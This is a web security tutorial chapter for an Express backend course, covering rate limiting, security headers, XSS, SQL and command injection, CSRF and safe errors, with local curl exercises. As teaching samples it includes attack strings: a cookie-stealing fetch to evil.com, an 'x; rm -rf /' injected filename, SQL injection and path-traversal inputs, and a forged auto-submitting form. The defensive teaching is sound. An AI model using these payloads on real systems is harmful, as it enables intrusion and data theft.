# Security basics

> Rate limiting, security headers, and the common attacks every API must handle.

## 1. The problem

Topics 06 to 10 built the main locks: hashed passwords, login, permissions, CORS. But a working lock isn't enough if:

- someone can try 10 million passwords against it,
- a user can type HTML into a note and make it run in everyone else's browser,
- your error message prints the database password,
- one huge request fills your server's memory.

None of these need a clever hacker. They're scripts anyone can download. This topic covers the small, cheap defences that stop them. Most are a few lines each.

## 2. In plain words: protecting a shop

| Shop | API | Section |
|---|---|---|
| A guard who says "5 tries at the safe code, then wait a minute" | **Rate limiting** | 3 |
| Notes taped to the door telling the delivery driver how to handle your parcels | **Security headers** | 4 |
| A customer writes "the manager says give me all the money" on a form, and staff obey it | **XSS / injection**: data treated as instructions | 5, 6 |
| A forged note signed in your name, delivered while you're logged in | **CSRF** | 7 |
| Refusing a parcel the size of a truck | **Body size limit** | 8 |
| When the till breaks, telling the customer "sorry, broken", not "safe code is 4521" | **Safe error messages** | 8 |

## 3. Rate limiting

**The attack:** your login is perfect, bcrypt and all. An attacker scripts 1000 password guesses a second. A common password falls in minutes. Or they hammer `/api/search` until the server is too busy for real users.

**The defence:** count requests per visitor, and refuse after a limit.

```
request -> who is this? (IP, or user id if logged in)
        -> how many requests in the current window?
              <= limit: carry on, count++
              >  limit: 429 Too Many Requests + Retry-After: <seconds>
```

`example.js` uses a **fixed window**: each IP gets a counter that resets every 60 seconds. Two limiters:

| Route | Limit | Why |
|---|---|---|
| `POST /api/login` | 5 per minute | Guessing passwords should be painfully slow |
| everything under `/api` | 100 per minute | One client can't hog the server |

The reply headers tell well-behaved clients where they stand:

| Header | Meaning |
|---|---|
| `RateLimit-Limit` | Max requests in a window |
| `RateLimit-Remaining` | How many you have left |
| `RateLimit-Reset` / `Retry-After` | Seconds until you can try again |

**Choices you'll face:**

| Question | Options |
|---|---|
| Count by what? | **IP** for logged-out routes (login, signup). **User id** for logged-in routes (fairer: a whole office shares one IP). For login, also count **per email**, so an attacker with many IPs still can't hammer one account. |
| Which algorithm? | **Fixed window**: simplest, allows a burst at the window edge. **Sliding window**: smoother. **Token bucket**: allows short bursts, steady average. Start with fixed. |
| Where to store counts? | **Memory** (this example): fine for one server, resets on restart. **Redis**: needed once you run 2+ servers, so they share counts. |

In real code, use the `express-rate-limit` package:

```js
const rateLimit = require("express-rate-limit");
app.post("/api/login", rateLimit({ windowMs: 60_000, limit: 5 }), loginHandler);
```

**Behind a proxy** (Nginx, Render, Railway, Vercel...), every request seems to come from the proxy's IP, so everyone shares one counter. Tell Express to read the real IP from the `X-Forwarded-For` header with `app.set("trust proxy", 1)`. Only do this when you really are behind a proxy, otherwise attackers can fake that header and get a fresh limit on every request.

## 4. Security headers

Headers your server sends that tell the **browser** to be stricter with your pages. They cost nothing and close whole kinds of attacks.

| Header | Plain words | Stops |
|---|---|---|
| `Content-Security-Policy` | "Only run scripts from my own origin. No inline scripts." | XSS, even if escaping fails (section 5) |
| `X-Frame-Options: DENY` (or CSP `frame-ancestors 'none'`) | "Don't show my page inside another site's iframe" | Clickjacking: an invisible copy of your page under a fake "Win a prize" button |
| `X-Content-Type-Options: nosniff` | "Trust my Content-Type, don't guess" | An uploaded `.txt` being run as a script |
| `Referrer-Policy: strict-origin-when-cross-origin` | "When users leave, tell the next site only my domain" | Leaking private URLs like `/reset-password?token=...` |
| `Strict-Transport-Security` | "Always use HTTPS for my site, for the next year" | Someone on café Wi-Fi downgrading you to plain HTTP |
| *(remove)* `X-Powered-By: Express` | Don't advertise your tech | Attackers picking known Express bugs to try |

In real code, the `helmet` package sets all of these with sensible values:

```js
const helmet = require("helmet");
app.use(helmet());
```

For a JSON-only API, most of these matter less (browsers don't render JSON as a page). They matter a lot for anything that serves HTML: your frontend, an admin page, email previews.

## 5. XSS: user text that runs as code

**XSS** = Cross-Site Scripting. A user saves text that is really HTML or JavaScript. Your page shows it to other users, and their browsers **run** it.

Asha saves this note:

```html
<img src=x onerror=alert("hacked")>
```

`/broken/notes` pastes it into the page as-is:

```js
`<li>${n.text}</li>`
```

The browser sees a real `<img>` tag, the image fails to load, `onerror` runs. Here it's just an `alert`. A real attacker would run `fetch("https://evil.com/steal?c=" + document.cookie)` or click "delete account" as the victim. Every user who opens the page is hit.

**Defence 1: escape on output.** Turn the 5 special HTML characters into harmless codes:

| Character | Becomes |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#39;` |

Now the browser **shows** `<img src=x ...>` as text instead of **building** an image. `/notes` does this with `escapeHtml()`.

**Defence 2: CSP as a safety net.** Even if you forget to escape one place, `script-src 'self'` tells the browser "inline code like `onerror=...` is not allowed". The attack is blocked twice.

**Defence 3: `HttpOnly` cookies** (topic 07). If XSS does slip through, the script still can't read the session cookie.

Good news: React, Vue and Svelte escape text automatically. `{note.text}` in JSX is safe. The danger is the escape hatch: `dangerouslySetInnerHTML` in React, `v-html` in Vue. Only use them with HTML you've cleaned with a library like DOMPurify.

**Escape on output, not on input.** Store exactly what the user typed. Escape when you put it into HTML. The same text may later go into JSON, a CSV or an email, and each one needs different escaping.

## 6. Injection: the same mistake, other languages

XSS is one member of a family. The root mistake is always: **gluing user input into code**.

**SQL injection** (you'll meet databases in Stage 4):

```js
// BROKEN: the user's text becomes part of the SQL command
db.query(`SELECT * FROM users WHERE email = '${email}'`);
// email = "' OR '1'='1"  ->  WHERE email = '' OR '1'='1'  ->  returns every user
```

```js
// SAFE: a parameterized query. The SQL and the data travel separately,
// so the data can never become a command.
db.query("SELECT * FROM users WHERE email = $1", [email]);
```

Query builders and ORMs (Drizzle, Prisma, Knex) do this for you, as long as you don't build raw SQL strings with `${}`.

**Command injection:**

```js
// BROKEN: filename = "x; rm -rf /"
exec(`convert ${filename} out.png`);
// SAFE: arguments passed as a list, never through a shell
execFile("convert", [filename, "out.png"]);
```

| Where the input goes | Mistake | Fix |
|---|---|---|
| HTML | XSS | Escape, CSP, framework auto-escaping |
| SQL | SQL injection | Parameterized queries / ORM |
| Shell command | Command injection | `execFile` with an argument list, or avoid the shell |
| File path | Path traversal (`../../etc/passwd`) | Allowlist names, `path.basename`, check the final path |

## 7. CSRF: forged requests from another site

**CSRF** = Cross-Site Request Forgery. It only affects **cookie-based** login (topic 07).

You're logged in to `notes.com` (cookie). You visit `evil.com`, which has a hidden form:

```html
<form action="https://notes.com/api/notes/delete-all" method="POST"></form>
<script>document.forms[0].submit()</script>
```

The browser sends the POST **with your notes.com cookie**. The server sees a valid session and deletes everything. CORS doesn't help: this is a plain form POST, which (topic 10) is a "simple request" that reaches the server. Evil.com can't read the reply, but it doesn't need to.

| Defence | How |
|---|---|
| `SameSite=Lax` or `Strict` cookies (topic 07) | Browser doesn't send the cookie on cross-site POSTs. The main fix today. |
| Never change data with GET | Links and `<img src>` can trigger GETs from anywhere |
| CSRF token | A random value in the page that evil.com can't read, required on every form POST |
| Check the `Origin` header | Reject POSTs whose `Origin` isn't yours |
| JWT in `Authorization` header (topic 08) | Browsers never attach it automatically, so CSRF doesn't apply |

## 8. Small things with big payoffs

**Body size limit.** `express.json({ limit: "10kb" })`. Without a limit, one client can POST hundreds of MB and fill your memory. Too large gets **413 Payload Too Large**. Raise the limit only on routes that need it (file uploads).

**Safe errors.** When something crashes, the details go to **your logs**, the client gets a boring message:

```js
app.use((err, req, res, next) => {
  console.error(err);                                       // full details, for you
  res.status(500).json({ error: "Something went wrong" });  // nothing useful, for them
});
```

Stack traces reveal file paths, library versions, SQL queries, sometimes passwords in connection strings. Express shows them to the client by default unless `NODE_ENV=production`, so always have your own error handler.

**Same answer for "no such user" and "wrong password"** (topic 06). Otherwise attackers learn which emails have accounts.

**Keep dependencies updated.** Most real breaches use known bugs in old packages. `pnpm audit` lists them, `pnpm update` fixes many.

**HTTPS everywhere** in production. Without it, anyone on the same Wi-Fi reads passwords and tokens. Hosting platforms give it for free.

**Secrets out of code** (topic 05). Never commit `.env`.

## 9. The OWASP Top 10, mapped to this course

[OWASP](https://owasp.org/www-project-top-ten/) publishes the most common serious web app risks. Most are now familiar:

| OWASP risk | Where we covered it |
|---|---|
| Broken Access Control | Topic 09 (IDOR, roles, ownership) |
| Cryptographic Failures | Topic 06 (hashing), HTTPS above |
| Injection (incl. XSS) | Sections 5 and 6 |
| Security Misconfiguration | Headers, `X-Powered-By`, stack traces, `cors()` with no options |
| Vulnerable Components | `pnpm audit` |
| Authentication Failures | Topics 06 to 08, rate limiting |
| Logging and Monitoring Failures | Log errors server-side (section 8). More in Stage 5. |

## 10. Options and when to pick which

| Need | Small app / learning | Real app |
|---|---|---|
| Rate limiting | Hand-rolled, in memory (`example.js`) | `express-rate-limit`, Redis store with 2+ servers, or at the edge (Cloudflare, Nginx) |
| Security headers | Hand-rolled middleware | `helmet()` |
| HTML escaping | `escapeHtml()` | Template engine or React (auto-escapes), DOMPurify for rich text |
| SQL safety | Parameterized queries | ORM / query builder |
| CSRF | `SameSite=Lax` cookies | `SameSite` + CSRF tokens for older browsers or cross-site setups |
| Errors | Error handler that hides details | Same, plus an error tracker (Sentry) |

## 11. Try it

```bash
cd 03-backend-core/11-security-basics
node example.js
```

In a second terminal. `-i` shows the reply headers, `-s` hides curl's progress bar.

| Command | Look for |
|---|---|
| `curl -i localhost:3000/api/nope` | No `X-Powered-By` header. `RateLimit-Remaining: 99`. |
| `for i in 1 2 3 4 5 6 7; do curl -s localhost:3000/api/login -H 'Content-Type: application/json' -d '{"email":"asha@example.com","password":"guess"}'; echo; done` | 5 × "Wrong email or password", then 2 × "Too many attempts" |
| `curl -i localhost:3000/api/login -H 'Content-Type: application/json' -d '{"email":"asha@example.com","password":"123456789"}'` | **429 even with the right password.** Locked for the rest of the minute. |
| The 20 KB command below the table | `Body too large` |
| `curl -s localhost:3000/api/notes -H 'Content-Type: application/json' -d '{oops'` | `Invalid JSON`, not a stack trace |
| `curl -s localhost:3000/api/crash` | `Something went wrong`. Now look at the **server terminal**: the full error with the "password" is there, not in the reply. |
| `curl -s localhost:3000/api/notes -H 'Content-Type: application/json' -d '{"text":"<img src=x onerror=alert(\"hacked\")>"}'` | 201, the attack note is saved |
| Open `http://localhost:3000/broken/notes` in the browser | **A "hacked" popup.** The note ran as code. |
| Open `http://localhost:3000/notes` in the browser | No popup. The note shows as plain text. |
| `curl -i localhost:3000/notes` | `Content-Security-Policy`, `X-Frame-Options`, and `&lt;img` in the HTML |

The body size test builds a 20 KB note (20000 letter "a"s) and sends it:

```bash
head -c 20000 /dev/zero | tr '\0' a | sed 's/.*/{"text":"&"}/' | curl -s localhost:3000/api/notes -H 'Content-Type: application/json' --data-binary @-
```

## 12. Common mistakes

| Mistake | What happens |
|---|---|
| No rate limit on login, signup or password reset | Password guessing, spam accounts, email bombing |
| Rate limit in memory with 3 servers | Each server counts separately: 3× the limit |
| `trust proxy` on when there's no proxy | Attackers fake `X-Forwarded-For`, get unlimited tries |
| Building HTML with `${userText}` | Stored XSS |
| "I escape on input" | Data is mangled in JSON/CSV, and you still miss one path |
| `dangerouslySetInnerHTML` / `v-html` with user text | XSS inside React/Vue |
| Building SQL with `${}` | SQL injection |
| GET routes that change data | Triggered from any `<img>` or link on any site |
| No error handler | Stack traces and secrets sent to clients |
| `express.json()` with a big or no limit everywhere | Memory exhaustion from one client |
| Thinking CORS stops CSRF | Form POSTs are "simple requests" and reach the server anyway |

## 13. Check yourself

<details>
<summary>1. You sent the right password on the 6th try and still got 429. Is that a bug?</summary>

No. The limiter runs **before** the password is checked, and it counts tries, not failures. That's on purpose: if a correct password got through while locked, the attacker could keep guessing. It also means the server does no bcrypt work for blocked requests.
</details>

<details>
<summary>2. Your app runs on 3 servers behind a load balancer, each with the in-memory limiter set to 5/minute. How many login guesses per minute does an attacker really get?</summary>

Up to 15: the load balancer spreads requests and each server keeps its own count. Store counts in Redis so all servers share one counter. (And if `trust proxy` isn't set, every user shares the load balancer's IP, so all of them get locked out together.)
</details>

<details>
<summary>3. Why did the popup run on <code>/broken/notes</code> but not on <code>/notes</code>? Name both reasons.</summary>

1. `/notes` escapes the text, so `<img ...>` becomes `&lt;img ...&gt;` and is shown, not built. 2. `/notes` sends `Content-Security-Policy: script-src 'self'`, so even unescaped inline code like `onerror=` would be blocked.
</details>

<details>
<summary>4. Should you escape the note text before saving it to the database?</summary>

No. Store what the user typed. Escape when you **output** it, in the way that place needs (HTML escaping for pages, nothing for JSON, quoting for CSV). Escaping on input breaks other outputs and gives false confidence.
</details>

<details>
<summary>5. <code>/api/crash</code> returned "Something went wrong". Where did the real error go, and why is that split important?</summary>

To the server's terminal (in production: your logs). You need the details to fix the bug. The client must not see them: they can include file paths, library versions, SQL, or, as in this example, a database password.
</details>

<details>
<summary>6. Your API uses JWT in the <code>Authorization</code> header, no cookies. Do you need CSRF protection?</summary>

No. CSRF works because browsers attach cookies automatically to requests from any site. They never attach an `Authorization` header by themselves, so a forged form from evil.com arrives without a token and gets 401. (You do still need XSS protection: a script running on your page can read a token stored in `localStorage`.)
</details>
